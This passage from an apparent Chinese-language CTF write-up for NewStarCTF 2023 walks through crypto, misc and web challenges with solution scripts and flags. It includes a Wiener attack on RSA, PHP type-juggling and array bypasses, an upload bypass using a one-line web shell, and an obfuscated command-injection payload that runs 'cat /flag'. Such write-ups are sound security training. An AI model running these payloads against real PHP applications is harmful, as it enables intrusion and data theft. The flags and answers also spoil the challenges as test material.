    <span class="token keyword">for</span> <span class="token punctuation">(</span>d<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> sub_fraction<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span>
        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可能会出现连分数的第一个为0的情况，排除</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span>
            <span class="token keyword">continue</span>

        phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k  <span class="token comment"># 这个结果就是 φ(n)</span>
        px<span class="token punctuation">,</span> qy <span class="token operator">=</span> get_pq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">if</span> px <span class="token operator">*</span> qy <span class="token operator">==</span> n<span class="token punctuation">:</span>
            p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>qy<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 可能会得到两个负数，负负得正未尝不会出现</span>
            d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span>
            <span class="token keyword">return</span> d
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"该方法不适用"</span><span class="token punctuation">)</span>


e <span class="token operator">=</span> <span class="token number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span>
n <span class="token operator">=</span> <span class="token number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span>
d <span class="token operator">=</span> wienerAttack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"d="</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>求出d后解密flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

c <span class="token operator">=</span> <span class="token number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span>
e <span class="token operator">=</span> <span class="token number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span>
n <span class="token operator">=</span> <span class="token number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span>
d <span class="token operator">=</span> <span class="token number">2357048593</span>

flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>flag按字节异或上f，需要爆破f，f的范围是一个字节0-255，把0-255按字节异或上c跑一遍就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token string">"e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"</span>
c <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>c<span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b <span class="token operator">^</span> key <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b"flag"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>仿射密码，这里要求解的问题是 置反(key[0]*f + key[1]) % modulus 这个操作</p>
<p>可以简化成m &#x3D; (c -key[1]) * key[0]的模逆，用扩欧几里得来求模逆</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> product

c <span class="token operator">=</span> <span class="token string">"dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064"</span>
c <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token comment"># 求模逆</span>
<span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> m <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">for</span> k0<span class="token punctuation">,</span> k1 <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    k0_inv <span class="token operator">=</span> modinv<span class="token punctuation">(</span>k0<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> k0_inv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    decrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">:</span>
        f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">-</span> k1<span class="token punctuation">)</span> <span class="token operator">*</span> k0_inv<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        decrypted<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span>

    flag <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>key是由两个相同的长度16字节的字符串组成，bytes_to_long(key) ^ bytes_to_long(iv) ^ 1这里只异或了key的16字节，所以可以算出key，然后用key的低位异或可以算出iv,用iv 和key 使用aes cbc mode就能解出flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

xor <span class="token operator">=</span> <span class="token number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>
flag <span class="token operator">=</span> <span class="token string">b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'</span>
xor <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>xor<span class="token punctuation">)</span>
key <span class="token operator">=</span> xor<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span>

iv <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>xor<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>

aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>
flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>base32 -&gt; base58 -&gt;base64</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;Base_15_S0_Easy_^_^&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>lsb隐写</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>看了一下，很多无用http的数据包 用http.response.code &#x3D;&#x3D; 200筛选后，找到这个</p>
<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;1.php?cmd&#x3D;base64%20&#x2F;.ffffllllllll11111144444GGGGGG|base64 HTTP&#x2F;1.1
Host: localhost
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;113.0.5666.197 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID&#x3D;85usgbksv9rn85kdcsgu5j0903
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
sec-ch-ua-platform: &quot;Windows&quot;
sec-ch-ua: &quot;Google Chrome&quot;;v&#x3D;&quot;113&quot;, &quot;Chromium&quot;;v&#x3D;&quot;113&quot;, &quot;Not&#x3D;A?Brand&quot;;v&#x3D;&quot;24&quot;
sec-ch-ua-mobile: ?0

HTTP&#x2F;1.1 200 OK
Date: Sat, 19 Aug 2023 06:20:45 GMT
Server: Apache&#x2F;2.4.51 (Debian)
X-Powered-By: PHP&#x2F;7.3.33
Vary: Accept-Encoding
Content-Encoding: gzip
Keep-Alive: timeout&#x3D;5, max&#x3D;100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text&#x2F;html; charset&#x3D;UTF-8

Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo&#x3D;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后base64解密两次，拿到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hardworking666/p/15866121.html">https://www.cnblogs.com/Hardworking666/p/15866121.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/109425270">https://blog.csdn.net/q20010619/article/details/109425270</a></p>
<p>搜了一下，缺个zip头 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29566629/article/details/122936177">https://blog.csdn.net/qq_29566629/article/details/122936177</a> </p>
<p>加上50 4B 03 04后解压，发现结尾有一串base64编码，解密后提示密码是6位数的，</p>
<p>用ARCHPR破解有些问题，搜了一下装了一个Ziperello，破解后拿到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>在这篇文章找到了解决方法 </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51999772/article/details/122418926">https://blog.csdn.net/qq_51999772/article/details/122418926</a></p>
<p><a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
<p>运行得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p>silenteye 下载这个工具，然后解密拿到flag</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye">https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye</a> </p>
<p><a target="_blank" rel="noopener" href="https://achorein.github.io/silenteye/">https://achorein.github.io/silenteye/</a></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>用dirmap 发现有个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 和robot 拼接index中的flag和robots的flag后得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>有段js的代码检测上传的类型，在firefox里面把js禁用后就能上传php文件了</p>
<p>用一句话木马加蚁剑在根目录下找到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;e9ed8544-e37e-4c4a-ac21-d7cacf157dbf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?ctf&#x3D;1 HTTP&#x2F;1.1
Host: node4.buuoj.cn:2866
User-Agent: NewStarCTF2023
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 28
Origin: newstarctf.com
DNT: 1
Connection: close
Referer: newstarctf.com
Cookie: power&#x3D;ctfer
X-Real-IP: 127.0.0.1
Upgrade-Insecure-Requests: 1

secret&#x3D;n3wst4rCTF2023g00000d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;5937a957-5910-4eec-91c3-84e1a8911d97&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247503.html">https://www.freebuf.com/articles/network/247503.html</a></p>
<p>根据提示，用空参数的时候flask就报错了，就把flag泄露出来了</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;98e6da3a-09a5-40e7-bac4-776d4dd52435.node4.buuoj.cn:81&#x2F;?number1&#x3D;1&amp;number2&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag &#x3D; &quot;flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>报错的地方在这里，空参数的时候request.args.get会返回’’ 然后int转型就会报错</p>
<pre class="line-numbers language-none"><code class="language-none">num1 &#x3D; request.args.get(&quot;number1&quot;);
num2 &#x3D; request.args.get(&quot;number2&quot;);

return &quot;not ssti,flag in source code~&quot;+str(int(num1)+int(num2))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>level1用0e绕过 level2传数组过去 level3传数组过去，level4加一个url编码is_numberic就识别不出来了，level5传一个符号就好了</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46145027/article/details/124514124">https://blog.csdn.net/qq_46145027/article/details/124514124</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12342124.html">https://www.cnblogs.com/zhengna/p/12342124.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Primzahl/p/6018158.html">https://www.cnblogs.com/Primzahl/p/6018158.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;34cb9ad6-2b68-4fd9-a2fc-9a6698c8b0c5.node4.buuoj.cn:81&#x2F;?key1&#x3D;QNKCDZO&amp;key2&#x3D;s878926199a&amp;key4[]&#x3D;1&amp;key5&#x3D;2024%20

post: key3[]&#x3D;@&amp;flag5[]&#x3D;@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;3a48262b-ac99-4f09-85ed-9ac23cec050e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>password爆破脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> string
<span class="token keyword">import</span> threading

TARGET_PREFIX <span class="token operator">=</span> <span class="token string">"c4d038"</span>
MAX_LENGTH <span class="token operator">=</span> <span class="token number">6</span>
CHARSET <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
THREADS <span class="token operator">=</span> <span class="token number">4</span>

<span class="token keyword">def</span> <span class="token function">generate_strings</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>CHARSET<span class="token punctuation">,</span> repeat<span class="token operator">=</span>length<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_string</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>islice<span class="token punctuation">(</span>generate_strings<span class="token punctuation">(</span>MAX_LENGTH<span class="token punctuation">)</span><span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>TARGET_PREFIX<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">threaded_bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    total_combinations <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CHARSET<span class="token punctuation">)</span> <span class="token operator">**</span> MAX_LENGTH
    step <span class="token operator">=</span> total_combinations <span class="token operator">//</span> THREADS

    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>THREADS<span class="token punctuation">)</span><span class="token punctuation">:</span>
        start <span class="token operator">=</span> i <span class="token operator">*</span> step
        end <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> step <span class="token keyword">if</span> i <span class="token operator">!=</span> THREADS <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">else</span> total_combinations
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>check_string<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># threaded_bruteforce()</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token string">"apofox"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>非法变量名的转换 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16804708.html">https://www.cnblogs.com/meng-han/p/16804708.html</a></p>
<p>phpinfo发现可以用拼接函数的方式绕过 <a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117469219">https://blog.csdn.net/LYJ20010728/article/details/117469219</a></p>
<pre class="line-numbers language-none"><code class="language-none">password&#x3D;apofox&amp;e[v.a.l&#x3D;(sy.(st).em)(&quot;ca&quot;.&quot;t &#x2F;fla&quot;.&quot;g&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>注册个账户后登录时候有个302的包显示这个，这个是个假的</p>
